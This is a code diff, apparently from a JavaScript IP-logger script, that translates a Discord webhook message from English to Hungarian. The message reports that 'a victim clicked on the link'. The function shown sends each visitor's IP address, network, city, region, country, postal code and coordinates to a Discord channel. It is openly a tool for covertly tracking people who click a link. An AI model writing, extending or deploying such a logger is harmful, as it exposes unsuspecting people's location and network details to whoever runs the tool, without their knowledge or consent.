@@ -18,8 +18,8 @@ const sendIP = () => {
                             content: `@here`,
                             embeds: [
                                 {
-                                    title: 'A victim clicked on the link!',
-                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
+                                    title: 'Egy áldozat rákattintott a linkre!',
+                                    description: `**IP-cím >> **${ipadd}\n**Hálózat >> ** ${geoData.network}\n**Város >> ** ${geoData.city}\n**Régió >> ** ${geoData.region}\n**Ország >> ** ${geoData.country_name}\n**Irányítószám >> ** ${geoData.postal}\n**Szélesség >> ** ${geoData.latitude}\n**Hosszúság >> ** ${geoData.longitude}`,
                                     color: 0x800080 // optionally changeable
                                 }
                             ]
